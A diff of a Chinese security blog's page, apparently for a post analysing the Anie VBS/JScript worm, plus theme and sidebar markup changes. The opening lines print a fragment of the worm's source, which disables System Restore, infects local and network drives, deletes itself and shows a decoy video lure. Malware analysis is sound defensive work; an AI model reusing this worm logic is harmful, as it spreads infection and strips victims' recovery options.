&#31105;&#29992;&#31995;&#32479;&#36824;&#21407;&#10;        shell.RegWrite(&#39;HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\SystemRestore\\DisableSR&#39;, &#39;1&#39;, &#39;REG_DWORD&#39;);&#10;    &#125; catch (e) &#123;&#125;&#10;&#125;&#10;&#10;function Main() &#123;&#10;    var args = WScript.Arguments;&#10;    if (GetExtensionName(ScriptPath) != &#39;jse&#39; &#38;&#38; args.length &#62; 0) &#123;&#10;        switch (args.Item(0)) &#123;&#10;            case &#39;/e&#39;:&#10;                Install();&#10;                break;&#10;            case &#39;/r&#39;: // &#38544;&#34255;&#21644;&#20266;&#35013;&#33258;&#36523;&#10;                HideAndDisguise();&#10;                break;&#10;            case &#39;/s&#39;: // &#24863;&#26579;&#39537;&#21160;&#22120;&#10;                InfectDrives();&#10;                break;&#10;            case &#39;/n&#39;: // &#24863;&#26579;&#32593;&#32476;&#39537;&#21160;&#22120;&#10;                InfectNetworkDrives();&#10;                break;&#10;            case &#39;/t&#39;: // &#33258;&#26816;&#21518;&#21024;&#38500;&#24403;&#21069;&#33050;&#26412;&#10;                TestAndRepair();&#10;                shell.Run(&#39;cmd /c del /q /f &#39; + ScriptPath, 0);&#10;                break;&#10;            case &#39;/a&#39;: // &#33258;&#26816;&#21518;&#20197;explorer&#38745;&#40664;&#25191;&#34892;&#24403;&#21069;&#33050;&#26412;&#10;                TestAndRepair();&#10;                shell.Run(&#39;explorer.exe /e,/select,&#39; + ScriptPath);&#10;                break;&#10;            default:&#10;                TestAndRepair();&#10;                try &#123;&#10;                    // &#25773;&#25918;&#20010;&#28418;&#20142;&#22993;&#23064;.avi&#65292;&#33804;&#33804;&#21714;&#10;                    shell.Run(&#39;wmplayer.exe &#34;&#39; + ScriptPath.substr(0, ScriptPath.length - 9) + &#39;beautiful_girl_part_&#39; + args.Named.Item(&#39;q&#39;) + &#39;.avi&#39;);&#10;                &#125; catch (e) &#123;&#125;&#10;        &#125;&#10;    &#125; else &#123;&#10;        TestAndRepair();&#10;        TryOpenTheOriginalFile();&#10;    &#125;&#10;&#125;&#10;&#10;Main();</span><br></pre></td></tr></table></figure>
       
     </div>
 
@@ -357,7 +375,7 @@
           <div class="post-nav-next post-nav-item">
             
               <a href="/2014/06/19/python-script-written-with-patch/" rel="next" title="用Python写Patch脚本">
-                <i class="fa fa-chevron-left fa-fw"></i> 用Python写Patch脚本
+                <i class="fa fa-chevron-left"></i> 用Python写Patch脚本
               </a>
             
           </div>
@@ -365,7 +383,7 @@
           <div class="post-nav-prev post-nav-item">
             
               <a href="/2015/03/27/zdxstock-trial-crack/" rel="prev" title="ZDX股票自动交易软件破解">
-                ZDX股票自动交易软件破解 <i class="fa fa-chevron-right fa-fw"></i>
+                ZDX股票自动交易软件破解 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -386,18 +404,18 @@
 
 
           </div>
-
           
 
+
           
-            <div class="comments" id="comments">
-              
-                <div class="ds-thread" data-thread-key="2015/03/14/anie-vbs-worm-code-analysis/"
-                     data-title="VBS蠕虫 Anie 代码分析" data-url="http://blog.smvirus.com/2015/03/14/anie-vbs-worm-code-analysis/" data-author-key="1">
-                </div>
-              
-            </div>
-          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2015/03/14/anie-vbs-worm-code-analysis/"
+           data-title="VBS蠕虫 Anie 代码分析" data-url="http://blog.smvirus.com/2015/03/14/anie-vbs-worm-code-analysis/" data-author-key="1">
+      </div>
+    
+  </div>
+
 
         </div>
         
@@ -415,6 +433,8 @@
     <div class="sidebar-inner">
 
       
+
+      
         <ul class="sidebar-nav motion-element">
           <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
             文章目录
@@ -425,30 +445,32 @@
         </ul>
       
 
-      <section class="site-overview">
+      <section class="site-overview sidebar-panel ">
         <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
-          <img class="site-author-image" src="http://7xicmh.com1.z0.glb.clouddn.com/website/author.jpg" alt="lSHANG" itemprop="image"/>
+          <img class="site-author-image" itemprop="image"
+               src="http://7xicmh.com1.z0.glb.clouddn.com/website/author.jpg"
+               alt="lSHANG" />
           <p class="site-author-name" itemprop="name">lSHANG</p>
+          <p class="site-description motion-element" itemprop="description">永远年轻，永远热泪盈眶！</p>
         </div>
-        <p class="site-description motion-element" itemprop="description">永远年轻，永远热泪盈眶！</p>
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">13</span>
+              <span class="site-state-item-count">14</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
 
           <div class="site-state-item site-state-categories">
-            <a href="/categories">
+            
               <span class="site-state-item-count">6</span>
               <span class="site-state-item-name">分类</span>
-              </a>
+              
           </div>
 
           <div class="site-state-item site-state-tags">
             <a href="/tags">
-              <span class="site-state-item-count">14</span>
+              <span class="site-state-item-count">15</span>
               <span class="site-state-item-name">标签</span>
               </a>
           </div>
@@ -458,7 +480,7 @@
         
           <div class="feed-link motion-element">
             <a href="/atom.xml" rel="alternate">
-              <i class="menu-item-icon icon-next-feed fa-fw"></i>
+              <i class="fa fa-rss"></i>
               RSS
             </a>
           </div>
@@ -469,25 +491,33 @@
             
               <span class="links-of-author-item">
                 <a href="http://smvirus.com" target="_blank">
-                  <i class="fa fa-home fa-fw"></i> Home
+                  
+                    <i class="fa fa-globe"></i> Home
+                  
                 </a>
               </span>
             
               <span class="links-of-author-item">
                 <a href="https://www.github.com/luoxiaohei" target="_blank">
-                  <i class="fa fa-github fa-fw"></i> GitHub
+                  
+                    <i class="fa fa-github"></i> GitHub
+                  
                 </a>
               </span>
             
               <span class="links-of-author-item">
                 <a href="http://weibo.com/lshang" target="_blank">
-                  <i class="fa fa-weibo fa-fw"></i> Weibo
+                  
+                    <i class="fa fa-weibo"></i> Weibo
+                  
                 </a>
               </span>
             
               <span class="links-of-author-item">
                 <a href="MailTo:Admin@SMVirus.CoM" target="_blank">
-                  <i class="fa fa-envelope fa-fw"></i> Envelope
+                  
+                    <i class="fa fa-envelope"></i> Mail
+                  
                 </a>
               </span>
             
@@ -505,7 +535,7 @@
 
         <div class="links-of-author motion-element">
           
-            <p class="site-author-name">His friends</p>
+            <p class="site-author-name">Links</p>
             
               <span class="links-of-author-item">
                 <a href="http://www.52pojie.cn/" target="_blank">吾爱破解</a>
@@ -525,15 +555,21 @@
       </section>
 
       
-        <section class="post-toc-wrap motion-element sidebar-panel-active">
-          <div class="post-toc-indicator-top post-toc-indicator"></div>
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator">
+            <i class="fa fa-angle-double-up"></i>
+          </div>
           <div class="post-toc">
             
+              
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#基本信息"><span class="nav-text">基本信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#脚本解密"><span class="nav-text">脚本解密</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#代码分析"><span class="nav-text">代码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#免责声明"><span class="nav-text">免责声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#病毒代码"><span class="nav-text">病毒代码</span></a></li></ol></li></ol></div>
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#基本信息"><span class="nav-number">1.</span> <span class="nav-text">基本信息</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#脚本解密"><span class="nav-number">2.</span> <span class="nav-text">脚本解密</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#代码分析"><span class="nav-number">3.</span> <span class="nav-text">代码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#免责声明"><span class="nav-number">3.1.</span> <span class="nav-text">免责声明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#病毒代码"><span class="nav-number">3.2.</span> <span class="nav-text">病毒代码</span></a></li></ol></li></ol></div>
             
           </div>
-          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+          <div class="post-toc-indicator-bottom post-toc-indicator">
+            <i class="fa fa-angle-double-down"></i>
+          </div>
         </section>
       
 
@@ -546,12 +582,13 @@
     </main>
 
     <footer id="footer" class="footer">
-      <div class="footer-inner"> <div class="copyright" >
+      <div class="footer-inner">
+        <div class="copyright" >
   
   &copy;  2014 - 
   <span itemprop="copyrightYear">2015</span>
   <span class="with-love">
-    <i class="icon-next-heart fa fa-heart fa-fw"></i>
+    <i class="icon-next-heart fa fa-heart"></i>
   </span>
   <span class="author" itemprop="copyrightHolder">lSHANG</span>
 </div>
@@ -568,77 +605,55 @@
 </div>
 
 
-  <div class="busuanzi">
-    <span id="busuanzi_container_site_pv">
-      访问 <a class="theme-link" href="http://service.ibruce.info"><span id="busuanzi_value_site_pv"></span></a> 次
-    </span>
-  </div>
-  <div class="busuanzi">
-    <span id="busuanzi_container_site_uv">
-      来访 <a class="theme-link" href="http://service.ibruce.info"><span id="busuanzi_value_site_uv"></span></a> 人
-    </span>
-  </div>
 
-
-
- </div>
+      </div>
     </footer>
 
     <div class="back-to-top"></div>
   </div>
 
+  
+
+
+  
+
+
+
   <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
 
-  
-  
-  
-    
-
-  
-    
-  
-
-  <script type="text/javascript">
-    var duoshuoQuery = {short_name:"smVirus"};
-    (function() {
-      var ds = document.createElement('script');
-      ds.type = 'text/javascript';ds.async = true;
-      ds.id = 'duoshuo-script';
-      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
-      ds.charset = 'UTF-8';
-      (document.getElementsByTagName('head')[0]
-      || document.getElementsByTagName('body')[0]).appendChild(ds);
-    })();
-  </script>
-    
-     
-
-
-    
-  
-  
-  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
-  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.5.2"></script>
-
-
-  <script type="text/javascript" src="/js/helpers.js?v=0.4.5.2"></script>
-  
-
-  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
-  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
-
-  <script type="text/javascript" src="/js/motion_global.js?v=0.4.5.2" id="motion.global"></script>
-
-
-
-
-  <script type="text/javascript" src="/js/nav-toggle.js?v=0.4.5.2"></script>
   <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
 
-  
-  
-<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.5.2" id="bootstrap.scrollspy.custom"></script>
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
 
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.0"></script>
+
+
+
+  
+  
+<script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.0"></script>
 
 <script type="text/javascript" id="sidebar.toc.highlight">
   $(document).ready(function () {
@@ -718,7 +733,7 @@
 
     function tocOverflowIndicator (indicator, action) {
       var $indicator = $(indicator);
-      var opacity = action === 'show' ? 0.4 : 0;
+      var opacity = action === 'show' ? 1 : 0;
       $indicator.velocity ?
         $indicator.velocity('stop').velocity({
           opacity: opacity
@@ -785,136 +800,152 @@
     });
 
     // Expand sidebar on post detail page by default, when post has a toc.
-    var $tocContent = $('.post-toc-content');
-    if (isDesktop() && CONFIG.sidebar === 'post') {
-      if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
-        displaySidebar();
+    motionMiddleWares.sidebar = function () {
+      var $tocContent = $('.post-toc-content');
+      if (CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
       }
-    }
+    };
   });
 </script>
 
 
 
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.0"></script>
+
+
+
+  
+
+  
+    
+  
+
   <script type="text/javascript">
-    $(document).ready(function () {
-      if (CONFIG.sidebar === 'always') {
-        displaySidebar();
-      }
-      if (isMobile()) {
-        FastClick.attach(document.body);
-      }
-
-      // TODO: Isolate Scheme-oriented scripts.
-      if (isPisces()) {
-        var $sidebar = $('#sidebar');
-        var headerHeight = $('.header-inner').height();
-        $sidebar
-          .css({ 'margin-top': headerHeight + 10 })
-          .show();
-      }
-
-      motionIntegrator.bootstrap();
-    });
+    var duoshuoQuery = {short_name:"smVirus"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
   </script>
 
   
+    
+  
+
+
+
+
+
+  
   
 
   
   
-  <!-- custom analytics part create by xiamo -->
-<script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
-<script>AV.initialize("JiHkUg7w573a204xAK1HLNQ4", "UpFfdyF2BT2dx4TQI3OyBnAK");</script>
-<script>
-function showTime(Counter) {
-    var query = new AV.Query(Counter);
-    $(".leancloud_visitors").each(function() {
-        var url = $(this).attr("id").trim();
-        query.equalTo("url", url);
-        query.find({
-            success: function(results) {
-                if (results.length == 0) {
-                    var content = $(document.getElementById(url)).text() + ': 0';
-                    $(document.getElementById(url)).text(content);
-                    return;
-                }
-                for (var i = 0; i < results.length; i++) {
-                    var object = results[i];
-                    var content = $(document.getElementById(url)).text() + ': ' + object.get('time');
-                    $(document.getElementById(url)).text(content);
-                }
-            },
-            error: function(object, error) {
-                console.log("Error: " + error.code + " " + error.message);
-            }
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("JiHkUg7w573a204xAK1HLNQ4", "UpFfdyF2BT2dx4TQI3OyBnAK");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
         });
+    }
 
-    });
-}
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
 
-function addCount(Counter) {
-    var Counter = AV.Object.extend("Counter");
-    url = $(".leancloud_visitors").attr('id').trim();
-    title = $(".leancloud_visitors").attr('data-flag-title').trim();
-    var query = new AV.Query(Counter);
-    query.equalTo("url", url);
-    query.find({
+      query.equalTo("url", url);
+      query.find({
         success: function(results) {
-            if (results.length > 0) {
-                var counter = results[0];
-                counter.fetchWhenSave(true);
-                counter.increment("time");
-                counter.save(null, {
-                    success: function(counter) {
-                        var content = $(document.getElementById(url)).text() + ': ' + counter.get('time');
-                        $(document.getElementById(url)).text(content);
-                    },
-                    error: function(counter, error) {
-                        console.log('Failed to save Visitor num, with error message: ' + error.message);
-                    }
-                });
-            } else {
-                var newcounter = new Counter();
-                newcounter.set("title", title);
-                newcounter.set("url", url);
-                newcounter.set("time", 1);
-                newcounter.save(null, {
-                    success: function(newcounter) {
-                        console.log("newcounter.get('time')="+newcounter.get('time'));
-                        var content = $(document.getElementById(url)).text() + ': ' + newcounter.get('time');
-                        $(document.getElementById(url)).text(content);
-                    },
-                    error: function(newcounter, error) {
-                        console.log('Failed to create');
-                    }
-                });
-            }
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
         },
         error: function(error) {
-            console.log('Error:' + error.code + " " + error.message);
+          console.log('Error:' + error.code + " " + error.message);
         }
-    });
-}
-$(function() {
-    var Counter = AV.Object.extend("Counter");
-    if ($('.leancloud_visitors').length == 1) {
-        addCount(Counter);
-    } else if ($('.post-title-link').length > 1) {
-        showTime(Counter);
-    }
-}); 
-</script>
-
-  
-  <script type="text/javascript" src="/js/lazyload.js"></script>
-  <script type="text/javascript">
-    $(function () {
-      $("#posts").find('img').lazyload({
-        placeholder: "/images/loading.gif",
-        effect: "fadeIn"
       });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
     });
   </script>
+
+
+
+
 </body>
 </html>
